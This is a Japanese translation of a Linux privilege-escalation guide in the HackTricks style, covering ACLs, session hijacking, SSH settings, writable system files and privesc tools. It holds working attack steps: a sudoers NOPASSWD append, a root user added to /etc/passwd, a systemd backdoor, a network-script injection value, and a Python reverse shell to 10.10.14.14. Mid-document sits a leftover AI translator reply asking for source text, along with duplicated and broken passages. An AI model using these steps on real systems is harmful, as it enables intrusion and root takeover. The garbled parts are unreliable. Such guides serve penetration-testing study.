Linux capabilities はプロセスに対して利用可能な root 特権の **サブセットを提供します**。これにより root の **特権をより小さく識別可能な単位に分割**でき、それぞれの単位を個別にプロセスへ付与できます。こうして特権の全体セットが削減され、悪用のリスクが低減します。\
以下のページを読んで、**capabilities とそれを悪用する方法**について詳しく学んでください：


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

ディレクトリでは、**"execute" ビット**は対象ユーザーが **"cd"** してフォルダに入れることを意味します。\
**"read"** ビットはユーザーが **list** によって **files** を確認できることを意味し、**"write"** ビットはユーザーが **delete** および **create** によって新しい **files** を作成・削除できることを意味します。

## ACLs

Access Control Lists (ACLs) は任意の権限の第二レイヤーを表し、従来の ugo/rwx 権限を **上書きすることができます**。これらの権限は、所有者やグループに属していない特定のユーザーに対して許可や拒否を与えることで、ファイルやディレクトリへのアクセス制御を強化します。このレベルの **粒度により、より正確なアクセス管理が可能になります**。詳細は [**こちら**](https://linuxconfig.org/how-to-manage-acls-on-linux) を参照してください。

**ユーザー "kali" にファイルの読み取りおよび書き込み権限を付与する：**
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**取得する** システムから特定のACLsを持つファイル:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### sudoersのドロップインに潜む隠れたACLバックドア

一般的な誤設定は、`/etc/sudoers.d/` にある root 所有でモードが `440` のファイルが、ACL 経由で低権限ユーザーに書き込みアクセスを与えていることです。
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
もし `user:alice:rw-` のようなものが見える場合、制限されたモードビットが設定されていても、そのユーザーは sudo ルールを追記できます:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
これは高い影響を持つ ACL persistence/privesc の経路で、`ls -l` のみのレビューでは見落としやすいです。

## 開いている shell セッション

**古いバージョン**では、別のユーザー（**root**）の**shell**セッションを**hijack**できる場合があります。\
**最新のバージョン**では、**自分のユーザー**の screen セッションにのみ**接続**できます。しかし、セッション内に**興味深い情報**が見つかることがあります。

### screen sessions hijacking

**screen セッションを一覧表示**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**セッションにアタッチ**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

これは **old tmux versions** による問題でした。非特権ユーザーとして root によって作成された tmux (v2.1) セッションを hijack することができませんでした。

**tmux セッションを一覧表示する**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**セッションにアタッチする**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006年9月から2008年5月13日までの間に、Debian ベースのシステム (Ubuntu, Kubuntu, etc) で生成されたすべての SSL および SSH キーは、このバグの影響を受ける可能性があります.\\
このバグはそれらの OS で新しい ssh キーを作成する際に発生し、**可能なバリエーションはわずか 32,768 通り**でした。つまり、全ての可能性を計算でき、**ssh public key を持っていれば対応する private key を検索できる**ということです。計算済みの候補はここで見つけられます: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** パスワード認証を許可するかどうかを指定します。デフォルトは `no` です。
- **PubkeyAuthentication:** public key 認証を許可するかどうかを指定します。デフォルトは `yes` です。
- **PermitEmptyPasswords**: パスワード認証が許可されている場合、サーバーが空のパスワード文字列のアカウントへのログインを許可するかどうかを指定します。デフォルトは `no` です。

### Login control files

これらのファイルは、誰がどのようにログインできるかに影響します:

- **`/etc/nologin`**: 存在する場合、root 以外のログインをブロックし、そのメッセージを表示します。
- **`/etc/securetty`**: root がログインできる場所を制限します（TTY 許可リスト）。
- **`/etc/motd`**: ログイン後のバナー（環境やメンテナンスの詳細を leak することがあり得ます）。

### PermitRootLogin

root が ssh を使ってログインできるかどうかを指定します。デフォルトは `no` です。可能な値:

- `yes`: root はパスワードおよび private key を使ってログインできます
- `without-password` or `prohibit-password`: root は private key のみでログインできます
- `forced-commands-only`: root は private key のみでログインでき、かつ commands オプションが指定されている場合に限ります
- `no`: ログイン不可

### AuthorizedKeysFile

ユーザー認証に使用できる public keys を含むファイルを指定します。`%h` のようなトークンを含めることができ、これはホームディレクトリに置換されます。**絶対パス**（`/` で始まる）または**ユーザーのホームからの相対パス**を指定できます。例えば:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
この設定は、ユーザー「**testusername**」の**private**キーでログインしようとすると、ssh があなたのキーの public key を `/home/testusername/.ssh/authorized_keys` と `/home/testusername/access` にあるものと比較することを示します。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding は、サーバー上に (without passphrases!) キーを残す代わりに、**use your local SSH keys instead of leaving keys** ことを可能にします。つまり、ssh 経由で **jump** **to a host** し、そこで **jump to another** host を **using** して、あなたの **initial host** にある **key** を使うことができます。

このオプションは `$HOME/.ssh.config` に次のように設定する必要があります:
```
Host example.com
ForwardAgent yes
```
Notice that if `Host` is `*` every time the user jumps to a different machine, that host will be able to access the keys (which is a security issue).

ファイル `/etc/ssh_config` はこの **オプション** を **上書き** して、この設定を許可または拒否できます.\
ファイル `/etc/sshd_config` はキーワード `AllowAgentForwarding` によって ssh-agent フォワーディングを **許可** または **拒否** できます（デフォルトは許可）。

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 興味深いファイル

### プロファイルファイル

ファイル `/etc/profile` と `/etc/profile.d/` 以下のファイルは、ユーザーが新しいシェルを実行したときに実行される **スクリプト** です。したがって、それらのいずれかに **書き込みまたは変更ができる場合、権限を昇格できます**。
```bash
ls -l /etc/profile /etc/profile.d/
```
不審な profile スクリプトが見つかった場合は、**機密情報**がないか確認してください。

### Passwd/Shadow ファイル

OSによっては`/etc/passwd`や`/etc/shadow`ファイルが別名になっている、またはバックアップが存在する場合があります。したがって、これらを**すべて見つけ**、ファイルを**読み取れるか確認して**、ファイル内に**ハッシュがあるか**を確認することをおすすめします:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
場合によっては、`/etc/passwd`（または同等のファイル）内に**password hashes**が見つかることがあります。
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 書き込み可能な /etc/passwd

まず、次のコマンドのいずれかでパスワードを生成します。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don't have the README.md content. Please paste the contents of src/linux-hardening/privilege-escalation/README.md that you want translated.

Also confirm how you want the generated password:
- length (e.g., 12)
- allowed characters (e.g., letters, digits, symbols)
- whether to include the password inline in the README (as plain text) or only show a command snippet

Once you provide the file and these choices I'll translate the text to Japanese (keeping markdown/html/tags/paths unchanged) and add the user `hacker` with the generated password as requested.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

これで `su` コマンドで `hacker:hacker` を使用できます

または、パスワードなしのダミーユーザーを追加するために、以下の行を使用できます。\
警告: マシンの現在のセキュリティが低下する可能性があります。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意: BSD プラットフォームでは `/etc/passwd` は `/etc/pwd.db` と `/etc/master.passwd` にあり、また `/etc/shadow` は `/etc/spwd.db` に名前が変わっています。

いくつかの機密ファイルに**書き込みできるか**を確認してください。例えば、いくつかの**サービス設定ファイル**に書き込めますか？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例えば、マシンが**tomcat**サーバーを実行していて、**/etc/systemd/内のTomcatサービス設定ファイルを変更できる**なら、次の行を変更できます:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
あなたの backdoor は次回 tomcat が起動したときに実行されます。

### Check Folders

以下のフォルダにはバックアップや興味深い情報が含まれている可能性があります: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (おそらく最後のものは読み取れないでしょうが、試してみてください)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 怪しい場所/Owned ファイル
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 直近数分で変更されたファイル
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB ファイル
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml ファイル
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隠しファイル
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH内のスクリプト/バイナリ**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Webファイル**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **バックアップ**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### パスワードを含む既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) のコードを読んでください。これは **パスワードを含んでいる可能性のある複数のファイル** を検索します。\
**もう一つの興味深いツール** は: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) で、Windows, Linux & Mac のローカルコンピュータに保存された多数のパスワードを取得するためのオープンソースアプリケーションです。

### ログ

ログを読むことができれば、**その中から興味深い/機密情報を見つけられる**かもしれません。ログが奇妙であればあるほど、（おそらく）より興味深くなります。\
また、いくつかの "**bad**" に設定された (backdoored?) **audit logs** は、audit logs 内に**パスワードを記録する**ことを許すかもしれません。詳細はこの投稿で説明されています: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
ログを読むには、**ログ閲覧用のグループ** [**adm**](interesting-groups-linux-pe/index.html#adm-group) が非常に役に立ちます。

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

ファイル名や中身に「**password**」という単語を含むファイル、ログ内のIPやメールアドレス、ハッシュの正規表現も確認してください。\
ここですべての方法を列挙するつもりはありませんが、興味がある場合は [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) が実行する最後のチェックを確認してください。

## 書き込み可能なファイル

### Python library hijacking

もし**どこから**pythonスクリプトが実行されるか分かっていて、そのフォルダに**書き込みできる**か、あるいは**pythonライブラリを変更できる**場合、OSライブラリを改変してbackdoorを仕込むことができます（pythonスクリプトが実行される場所に書き込みできる場合は、os.pyライブラリをコピーして貼り付けてください）。

ライブラリを**backdoor the library**するには、os.pyライブラリの末尾に以下の行を追加してください（IPとPORTを変更してください）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate の悪用

A vulnerability in `logrotate` lets users with **write permissions** on a log file or its parent directories potentially gain escalated privileges. This is because `logrotate`, often running as **root**, can be manipulated to execute arbitrary files, especially in directories like _**/etc/bash_completion.d/**_. It's important to check permissions not just in _/var/log_ but also in any directory where log rotation is applied.

> [!TIP]
> This vulnerability affects `logrotate` version `3.18.0` and older

この脆弱性の詳細は次のページで確認できます: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。

この脆弱性は [**logrotten**](https://github.com/whotwagner/logrotten) を使って悪用できます。

This vulnerability is very similar to [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** so whenever you find that you can alter logs, check who is managing those logs and check if you can escalate privileges substituting the logs by symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**脆弱性の参照:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

If, for whatever reason, a user is able to **write** an `ifcf-<whatever>` script to _/etc/sysconfig/network-scripts_ **or** it can **adjust** an existing one, then your **system is pwned**.

何らかの理由でユーザーが _/etc/sysconfig/network-scripts_ に `ifcf-<whatever>` スクリプトを **書き込み** できる、または既存のものを **編集** できる場合、あなたの **system is pwned**。

Network scripts, _ifcg-eth0_ for example are used for network connections. They look exactly like .INI files. However, they are \~sourced\~ on Linux by Network Manager (dispatcher.d).

Network scripts（例: _ifcg-eth0_）はネットワーク接続に使われます。見た目は .INI ファイルそのものです。しかし、これらは Network Manager（dispatcher.d）によって Linux 上で \~sourced\~ されます。

In my case, the `NAME=` attributed in these network scripts is not handled correctly. If you have **white/blank space in the name the system tries to execute the part after the white/blank space**. This means that **everything after the first blank space is executed as root**.

私の場合、これらのネットワークスクリプト内の `NAME=` の扱いが正しくありません。名前に**空白が含まれていると、システムは空白の後の部分を実行しようとします**。つまり、**最初の空白以降のすべてが root として実行されます**。

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
（_Network と /bin/id の間の空白に注意_）

### **init, init.d, systemd と rc.d**

ディレクトリ `/etc/init.d` は System V init (SysVinit) 用の **scripts** の格納場所です。ここにはサービスを `start`、`stop`、`restart`、場合によっては `reload` するスクリプトが含まれます。これらは直接実行するか、`/etc/rc?.d/` にあるシンボリックリンク経由で実行できます。Redhat 系では代替パスとして `/etc/rc.d/init.d` が使われます。

一方、`/etc/init` は Ubuntu が導入した **Upstart** に関連しており、サービス管理のための設定ファイルを使用します。Upstart への移行が行われた後も、互換レイヤーのために SysVinit スクリプトが Upstart 構成と併用されることがあります。

**systemd** は、オンデマンドでのデーモン起動、automount 管理、システム状態のスナップショットなどの高度な機能を提供するモダンな初期化およびサービスマネージャとして登場しました。ディストリビューションパッケージ用のファイルは `/usr/lib/systemd/` に、管理者が変更するためのファイルは `/etc/systemd/system/` に整理されており、システム管理を簡素化します。

## その他のトリック

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks は一般的に syscall をフックして、privileged kernel 機能を userspace の manager に露出させます。管理者側の認証が弱い（例：FD-order に基づく signature チェックや脆弱なパスワード方式）と、ローカルアプリが manager を偽装して、既に root 化されたデバイス上で root にエスカレートできる可能性があります。詳細およびエクスプロイトの情報は次を参照してください：


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex 駆動のサービス検出が VMware Tools/Aria Operations 内でプロセスのコマンドラインからバイナリパスを抽出し、特権コンテキストで `-v` を付けて実行してしまうことがあります。許容的なパターン（例：`\S` の使用）は、書き込み可能な場所（例：/tmp/httpd）に配置された攻撃者のリスナーと一致する可能性があり、root としての実行につながります（CWE-426 Untrusted Search Path）。

詳細および他の discovery/monitoring スタックにも適用できる一般化パターンは次を参照してください：

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## その他のヘルプ

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc ツール

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
